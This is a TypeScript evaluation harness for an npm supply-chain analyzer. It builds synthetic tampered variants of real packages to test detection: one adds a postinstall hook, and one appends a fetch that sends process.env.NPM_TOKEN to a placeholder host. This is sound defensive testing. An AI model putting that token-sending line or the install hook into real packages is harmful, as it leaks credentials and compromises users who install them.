import { readdir, readFile, writeFile } from "node:fs/promises";
import { analyze } from "../src/index.js";
import { memorySnapshot, adapters } from "../src/testing.js";
import type { ArtifactSnapshot, SourceSnapshot } from "@vajra/contracts";
interface Case {
  name: string;
  version: string;
  repositoryUrl: string;
  commit: string;
  artifactSha256: string;
  sourceSha256: string;
  artifactUrl: string;
  sourceUrl: string;
  packageFiles: Record<string, string | { base64: string }>;
  sourceFiles: Record<string, string | { base64: string }>;
}
const decode = (
  files: Case["packageFiles"],
): Record<string, string | Uint8Array> =>
  Object.fromEntries(
    Object.entries(files).map(([p, v]) => [
      p,
      typeof v === "string" ? v : Buffer.from(v.base64, "base64"),
    ]),
  );
const results = [];
for (const file of (await readdir(".vajra/evaluation")).filter(
  (f) => f.endsWith(".json") && !f.startsWith("results"),
)) {
  const c: Case = JSON.parse(
    await readFile(".vajra/evaluation/" + file, "utf8"),
  );
  for (const variant of [
    "original",
    "lifecycle-injection",
    "network-injection",
    "harmless-addition",
  ] as const) {
    const files = decode(c.packageFiles);
    if (variant === "lifecycle-injection") {
      const m = JSON.parse(String(files["package.json"]!));
      m.scripts = { ...m.scripts, postinstall: "node unexpected-install.js" };
      files["package.json"] = JSON.stringify(m, null, 2) + "\n";
      files["unexpected-install.js"] =
        'require("node:child_process").exec("echo controlled-fixture");\n';
    }
    if (variant === "network-injection") {
      const m = JSON.parse(String(files["package.json"]!));
      let main = typeof m.main === "string" ? m.main : "index.js";
      main = main.replace(/^\.\//, "");
      if (!files[main]) throw new Error("No entry point for fixture " + c.name);
      files[main] +=
        '\nfetch("https://example.invalid/fixture", { body: process.env.NPM_TOKEN });\n';
    }
    if (variant === "harmless-addition")
      files["BUILD-NOTE.txt"] =
        "Controlled evaluation fixture: release packaging note.\n";
    const memory = memorySnapshot(files);
    const artifact: ArtifactSnapshot = {
      ...memory,
      sha256: variant === "original" ? c.artifactSha256 : memory.sha256,
      root: "",
      metadata: {
        name: c.name,
        version: c.version,
        repository: { url: c.repositoryUrl },
        gitHead: c.commit,
      },
    };
    const source: SourceSnapshot = {
      ...memorySnapshot(decode(c.sourceFiles)),
      sha256: c.sourceSha256,
      commit: c.commit,
      repositoryUrl: c.repositoryUrl,
    };
    const report = await analyze(
      {
        artifact: { kind: "npm", name: c.name, version: c.version },
        source: { kind: "auto" },
      },
      {
        analysisId:
          "eval_" +
          c.name.replace(/-/g, "_") +
          "_" +
          variant.replace(/-/g, "_"),
        ingestion: adapters(artifact, source),
        workspaceDir: ".vajra",
        async resolveUpload() {
          throw new Error("Not used");
        },
        async saveFileDetail() {},
      },
    );
    const suspicious = report.findings.filter(
      (f) => f.classification === "suspicious_change",
    );
    const result = {
      name: c.name,
      version: c.version,
      variant,
      commit: c.commit,
      artifactSha256: artifact.sha256,
      sourceSha256: c.sourceSha256,
      artifactUrl: c.artifactUrl,
      sourceUrl: c.sourceUrl,
      modifiedDigestKind:
        variant === "original" ? "archive" : "canonical-entry-inventory",
      status: report.status,
      sourceMethod: report.source.method,
      totalFindings: report.findings.length,
      suspiciousFindings: suspicious.map((f) => ({
        ruleId: f.ruleId,
        severity: f.severity,
        title: f.title,
      })),
      durationMs: Math.round(report.durationMs),
    };
    results.push(result);
    console.log(
      c.name,
      variant,
      "suspicious=" + suspicious.length,
      "source=" + report.source.method,
    );
  }
}
await writeFile(
  ".vajra/evaluation/results.json",
  JSON.stringify(
    {
      scope:
        "Deterministic evaluation only; models disabled. Controls are real releases, injection cases are synthetic. This is not a general malware accuracy benchmark.",
      results,
    },
    null,
    2,
  ) + "\n",
);
